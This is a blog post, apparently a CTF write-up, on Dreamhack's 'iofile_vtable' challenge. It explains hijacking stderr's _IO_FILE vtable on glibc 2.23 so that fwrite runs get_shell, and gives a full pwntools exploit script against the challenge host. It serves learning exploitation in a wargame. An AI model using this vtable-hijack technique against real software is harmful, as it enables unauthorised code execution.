@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Dreamhack iofile_vtable Writeup | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="Dreamhack, pwn">
+<meta name="description" content="Challenge overview
+이 문제는 서버에서 작동하고 있는 서비스(iofile_vtable)의 바이너리와 소스 코드가 주어집니다.
+프로그램의 취약점을 찾고 익스플로잇해 get_shell 함수를 실행시키세요.
+셸을 획득한 후, &ldquo;flag&rdquo; 파일을 읽어 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
+플래그의 형식은 DH{&hellip;} 입니다.
+
+The environment is using Ubuntu 16.04 which clues at libc version 2.23. This libc version doesn&rsquo;t flip out when _IO_FILE-&gt;vtable points to some random address.
+initialize(argc, argv, envp);
+  printf(&#34;what is your name: &#34;);
+  read(0, &amp;name, 8u);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      puts(&#34;1. print&#34;);
+      puts(&#34;2. error&#34;);
+      puts(&#34;3. read&#34;);
+      puts(&#34;4. chance&#34;);
+      printf(&#34;&gt; &#34;);
+      __isoc99_scanf(&#34;%d&#34;, v3);
+      if ( v3[0] != 2 )
+        break;
+      fwrite(&#34;ERROR\n&#34;, 1u, 6u, stderr);
+    }
+    if ( v3[0] &gt; 2 )
+    {
+      if ( v3[0] == 3 )
+      {
+        fgetc(stdin);
+      }
+      else if ( v3[0] == 4 )
+      {
+        printf(&#34;change: &#34;);
+        read(0, &amp;stderr[1], 8u);
+      }
+    }
+    else if ( v3[0] == 1 )
+    {
+      puts(&#34;GOOD&#34;);
+    }
+Identifying the vulnerabilities
+The challenge name is pretty intuitive, we need to overwrite the vtable in the _IO_FILE structure. We&rsquo;re given a write right into stderr[1], which is the vtable. Our write, stderr, is the head of the _IO_list_all struct.">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/iofile_vtable-writeup/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.0104eb9d8f72dfc23e72924f1f282ad928b9467519160af39d6ea2ca5ea692a4.css" integrity="sha256-AQTrnY9y38I&#43;cpJPHygq2Si5RnUZFgrznW6iyl6mkqQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/iofile_vtable-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/iofile_vtable-writeup/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="Dreamhack iofile_vtable Writeup">
+  <meta property="og:description" content="Challenge overview 이 문제는 서버에서 작동하고 있는 서비스(iofile_vtable)의 바이너리와 소스 코드가 주어집니다. 프로그램의 취약점을 찾고 익스플로잇해 get_shell 함수를 실행시키세요. 셸을 획득한 후, “flag” 파일을 읽어 워게임 사이트에 인증하면 점수를 획득할 수 있습니다. 플래그의 형식은 DH{…} 입니다.
+The environment is using Ubuntu 16.04 which clues at libc version 2.23. This libc version doesn’t flip out when _IO_FILE-&gt;vtable points to some random address.
+initialize(argc, argv, envp); printf(&#34;what is your name: &#34;); read(0, &amp;name, 8u); while ( 1 ) { while ( 1 ) { puts(&#34;1. print&#34;); puts(&#34;2. error&#34;); puts(&#34;3. read&#34;); puts(&#34;4. chance&#34;); printf(&#34;&gt; &#34;); __isoc99_scanf(&#34;%d&#34;, v3); if ( v3[0] != 2 ) break; fwrite(&#34;ERROR\n&#34;, 1u, 6u, stderr); } if ( v3[0] &gt; 2 ) { if ( v3[0] == 3 ) { fgetc(stdin); } else if ( v3[0] == 4 ) { printf(&#34;change: &#34;); read(0, &amp;stderr[1], 8u); } } else if ( v3[0] == 1 ) { puts(&#34;GOOD&#34;); } Identifying the vulnerabilities The challenge name is pretty intuitive, we need to overwrite the vtable in the _IO_FILE structure. We’re given a write right into stderr[1], which is the vtable. Our write, stderr, is the head of the _IO_list_all struct.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-05-22T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-05-22T00:00:00+00:00">
+    <meta property="article:tag" content="Dreamhack">
+    <meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Dreamhack iofile_vtable Writeup">
+<meta name="twitter:description" content="Challenge overview
+이 문제는 서버에서 작동하고 있는 서비스(iofile_vtable)의 바이너리와 소스 코드가 주어집니다.
+프로그램의 취약점을 찾고 익스플로잇해 get_shell 함수를 실행시키세요.
+셸을 획득한 후, &ldquo;flag&rdquo; 파일을 읽어 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
+플래그의 형식은 DH{&hellip;} 입니다.
+
+The environment is using Ubuntu 16.04 which clues at libc version 2.23. This libc version doesn&rsquo;t flip out when _IO_FILE-&gt;vtable points to some random address.
+initialize(argc, argv, envp);
+  printf(&#34;what is your name: &#34;);
+  read(0, &amp;name, 8u);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      puts(&#34;1. print&#34;);
+      puts(&#34;2. error&#34;);
+      puts(&#34;3. read&#34;);
+      puts(&#34;4. chance&#34;);
+      printf(&#34;&gt; &#34;);
+      __isoc99_scanf(&#34;%d&#34;, v3);
+      if ( v3[0] != 2 )
+        break;
+      fwrite(&#34;ERROR\n&#34;, 1u, 6u, stderr);
+    }
+    if ( v3[0] &gt; 2 )
+    {
+      if ( v3[0] == 3 )
+      {
+        fgetc(stdin);
+      }
+      else if ( v3[0] == 4 )
+      {
+        printf(&#34;change: &#34;);
+        read(0, &amp;stderr[1], 8u);
+      }
+    }
+    else if ( v3[0] == 1 )
+    {
+      puts(&#34;GOOD&#34;);
+    }
+Identifying the vulnerabilities
+The challenge name is pretty intuitive, we need to overwrite the vtable in the _IO_FILE structure. We&rsquo;re given a write right into stderr[1], which is the vtable. Our write, stderr, is the head of the _IO_list_all struct.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Dreamhack iofile_vtable Writeup",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/iofile_vtable-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Dreamhack iofile_vtable Writeup",
+  "name": "Dreamhack iofile_vtable Writeup",
+  "description": "Challenge overview 이 문제는 서버에서 작동하고 있는 서비스(iofile_vtable)의 바이너리와 소스 코드가 주어집니다. 프로그램의 취약점을 찾고 익스플로잇해 get_shell 함수를 실행시키세요. 셸을 획득한 후, \u0026ldquo;flag\u0026rdquo; 파일을 읽어 워게임 사이트에 인증하면 점수를 획득할 수 있습니다. 플래그의 형식은 DH{\u0026hellip;} 입니다.\nThe environment is using Ubuntu 16.04 which clues at libc version 2.23. This libc version doesn\u0026rsquo;t flip out when _IO_FILE-\u0026gt;vtable points to some random address.\ninitialize(argc, argv, envp); printf(\u0026#34;what is your name: \u0026#34;); read(0, \u0026amp;name, 8u); while ( 1 ) { while ( 1 ) { puts(\u0026#34;1. print\u0026#34;); puts(\u0026#34;2. error\u0026#34;); puts(\u0026#34;3. read\u0026#34;); puts(\u0026#34;4. chance\u0026#34;); printf(\u0026#34;\u0026gt; \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, v3); if ( v3[0] != 2 ) break; fwrite(\u0026#34;ERROR\\n\u0026#34;, 1u, 6u, stderr); } if ( v3[0] \u0026gt; 2 ) { if ( v3[0] == 3 ) { fgetc(stdin); } else if ( v3[0] == 4 ) { printf(\u0026#34;change: \u0026#34;); read(0, \u0026amp;stderr[1], 8u); } } else if ( v3[0] == 1 ) { puts(\u0026#34;GOOD\u0026#34;); } Identifying the vulnerabilities The challenge name is pretty intuitive, we need to overwrite the vtable in the _IO_FILE structure. We\u0026rsquo;re given a write right into stderr[1], which is the vtable. Our write, stderr, is the head of the _IO_list_all struct.\n",
+  "keywords": [
+    "Dreamhack", "pwn"
+  ],
+  "articleBody": "Challenge overview 이 문제는 서버에서 작동하고 있는 서비스(iofile_vtable)의 바이너리와 소스 코드가 주어집니다. 프로그램의 취약점을 찾고 익스플로잇해 get_shell 함수를 실행시키세요. 셸을 획득한 후, “flag” 파일을 읽어 워게임 사이트에 인증하면 점수를 획득할 수 있습니다. 플래그의 형식은 DH{…} 입니다.\nThe environment is using Ubuntu 16.04 which clues at libc version 2.23. This libc version doesn’t flip out when _IO_FILE-\u003evtable points to some random address.\ninitialize(argc, argv, envp); printf(\"what is your name: \"); read(0, \u0026name, 8u); while ( 1 ) { while ( 1 ) { puts(\"1. print\"); puts(\"2. error\"); puts(\"3. read\"); puts(\"4. chance\"); printf(\"\u003e \"); __isoc99_scanf(\"%d\", v3); if ( v3[0] != 2 ) break; fwrite(\"ERROR\\n\", 1u, 6u, stderr); } if ( v3[0] \u003e 2 ) { if ( v3[0] == 3 ) { fgetc(stdin); } else if ( v3[0] == 4 ) { printf(\"change: \"); read(0, \u0026stderr[1], 8u); } } else if ( v3[0] == 1 ) { puts(\"GOOD\"); } Identifying the vulnerabilities The challenge name is pretty intuitive, we need to overwrite the vtable in the _IO_FILE structure. We’re given a write right into stderr[1], which is the vtable. Our write, stderr, is the head of the _IO_list_all struct.\nWe also have a get_shell function. But what exactly to overwrite?\nWhen a function like fwrite is called, it fetches the function it needs from the vtable by accessing _IO_FILE-\u003evtable, in our case _IO_file_jumps. And after I read the documentation, I found that fwrite will try to fetch _IO_file_jumps+56, _IO_new_file_xsputn.\nAt first, I tried to give the vtable get_shell - 56 but that gave an error - it was trying to access what was inside get_shell (I mean as a pointer). But we also have a write into the bss through name, so we can leverage that, by making name point to get_shell and overwriting vtable with name - 56.\n#0x7ffff7f90060 \u003c_IO_file_jumps+48\u003e: 0x00007ffff7e3a5e0 0x00007ffff7e379c0 #0x7ffff7e379c0 \u003c_IO_new_file_xsputn\u003e: 0x417974d28548c031 And, that worked!\nThe exploit from pwn import * elf = ELF(\"./iofile_vtable\") #libc = ELF(\"./libc.so.6\") context.arch = 'amd64' cyberedu = 'host8.dreamhack.games:16916' ip, port = cyberedu.split(':') port = int(port) if args.REMOTE: p = remote(ip, port) else: p = elf.process() #x/5gx 0x6010C0 #0x6010c0 : 0x00007ffff7f924e0 #0x7ffff7f924e0 is stderr -\u003e _IO_list_all atm #vtable is after the *file structure #we write at stderr +1 -\u003e exactly inside its vtable #question is, what function is going to get called from vtable. getshell = 0x40094a name = 0x6010D0 #gdb.attach(p) p.recvuntil(b\": \") p.send(p64(getshell)) p.recvuntil(b\"\u003e \") p.sendline(b\"4\") p.send(p64(name-56)) p.recvuntil(b\"\u003e \") p.sendline(b\"2\") #i set a bp inside the fwrite #also that does vtable -\u003e_IO_FILE_xsputn #0x7ffff7f90060 \u003c_IO_file_jumps+48\u003e: 0x00007ffff7e3a5e0 0x00007ffff7e379c0 #0x7ffff7e379c0 \u003c_IO_new_file_xsputn\u003e: 0x417974d28548c031 #face call [addr + 0x38] #adica ce e acolo inauntru #de aia ni se da name? #dam name - 0x38, si in name punem p64(getshell) p.interactive() As always, the full code can be found on my GitHub here.\n",
+  "wordCount" : "454",
+  "inLanguage": "en",
+  "datePublished": "2026-05-22T00:00:00Z",
+  "dateModified": "2026-05-22T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/iofile_vtable-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">
+                <img src="/writeup-blog/images/sakura.png" alt="" aria-label="logo"
+                     style="vertical-align:middle; margin-right:8px; display:inline-block;">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Dreamhack iofile_vtable Writeup
+    </h1>
+    <div class="post-meta"><span title='2026-05-22 00:00:00 +0000 UTC'>May 22, 2026</span>&nbsp;·&nbsp;<span>3 min</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#challenge-overview" aria-label="Challenge overview">Challenge overview</a></li>
+                <li>
+                    <a href="#identifying-the-vulnerabilities" aria-label="Identifying the vulnerabilities">Identifying the vulnerabilities</a></li>
+                <li>
+                    <a href="#the-exploit" aria-label="The exploit">The exploit</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="challenge-overview">Challenge overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h2>
+<p>이 문제는 서버에서 작동하고 있는 서비스(iofile_vtable)의 바이너리와 소스 코드가 주어집니다.
+프로그램의 취약점을 찾고 익스플로잇해 get_shell 함수를 실행시키세요.
+셸을 획득한 후, &ldquo;flag&rdquo; 파일을 읽어 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
+플래그의 형식은 DH{&hellip;} 입니다.</p>
+<hr>
+<p>The environment is using Ubuntu 16.04 which clues at libc version 2.23. This libc version doesn&rsquo;t flip out when <code>_IO_FILE-&gt;vtable</code> points to some random address.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">initialize</span>(argc, argv, envp);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;what is your name: &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>name, <span style="color:#ae81ff">8u</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;1. print&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;2. error&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;3. read&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;4. chance&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, v3);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( v3[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span> )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fwrite</span>(<span style="color:#e6db74">&#34;ERROR</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1u</span>, <span style="color:#ae81ff">6u</span>, stderr);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( v3[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">2</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( v3[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span> )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fgetc</span>(stdin);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( v3[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span> )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;change: &#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>stderr[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">8u</span>);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( v3[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;GOOD&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><h2 id="identifying-the-vulnerabilities">Identifying the vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#identifying-the-vulnerabilities">#</a></h2>
+<p>The challenge name is pretty intuitive, we need to overwrite the vtable in the <code>_IO_FILE</code> structure. We&rsquo;re given a write right into <code>stderr[1]</code>, which is the <code>vtable</code>. Our write, stderr, is the head of the <code>_IO_list_all</code> struct.</p>
+<p>We also have a <code>get_shell</code> function. But what exactly to overwrite?</p>
+<p>When a function like <code>fwrite</code> is called, it fetches the function it needs from the <code>vtable</code> by accessing <code>_IO_FILE-&gt;vtable</code>, in our case <code>_IO_file_jumps</code>. And after I read the documentation, I found that <code>fwrite</code> will try to fetch <code>_IO_file_jumps+56</code>, <code>_IO_new_file_xsputn</code>.</p>
+<p>At first, I tried to give the <code>vtable</code> <code>get_shell - 56</code> but that gave an error - it was trying to access what was <em>inside</em> <code>get_shell</code> (I mean as a pointer). But we also have a write into the <code>bss</code> through <em>name</em>, so we can leverage that, by making name point to <code>get_shell</code> and overwriting <code>vtable</code> with <code>name - 56</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#0x7ffff7f90060 &lt;_IO_file_jumps+48&gt;:     0x00007ffff7e3a5e0      0x00007ffff7e379c0</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#0x7ffff7e379c0 &lt;_IO_new_file_xsputn&gt;:   0x417974d28548c031 </span>
+</span></span></code></pre></div><p>And, that worked!</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/iofile_vtable-writeup/flag.png#center"></p>
+<h2 id="the-exploit">The exploit<a hidden class="anchor" aria-hidden="true" href="#the-exploit">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span>  ELF(<span style="color:#e6db74">&#34;./iofile_vtable&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#libc = ELF(&#34;./libc.so.6&#34;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>cyberedu <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;host8.dreamhack.games:16916&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip, port <span style="color:#f92672">=</span> cyberedu<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> int(port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(ip, port)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#x/5gx 0x6010C0</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#0x6010c0 &lt;stderr@@GLIBC_2.2.5&gt;: 0x00007ffff7f924e0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#0x7ffff7f924e0 is stderr -&gt; _IO_list_all atm</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#vtable is after the *file structure</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#we write at stderr +1 -&gt; exactly inside its vtable</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#question is, what function is going to get called from vtable.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>getshell <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40094a</span>
+</span></span><span style="display:flex;"><span>name <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6010D0</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#gdb.attach(p)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(p64(getshell))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(p64(name<span style="color:#f92672">-</span><span style="color:#ae81ff">56</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#i set a bp inside the fwrite</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#also that does vtable -&gt;_IO_FILE_xsputn</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#0x7ffff7f90060 &lt;_IO_file_jumps+48&gt;:     0x00007ffff7e3a5e0      0x00007ffff7e379c0</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#0x7ffff7e379c0 &lt;_IO_new_file_xsputn&gt;:   0x417974d28548c031 </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#face call [addr + 0x38]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#adica ce e acolo inauntru</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#de aia ni se da name?</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#dam name - 0x38, si in name punem p64(getshell)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><hr>
+<p>As always, the full code can be found on my GitHub
+<strong><a href="https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/iofile_vtable.py">here</a></strong>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/dreamhack/">Dreamhack</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/pwn/">Pwn</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
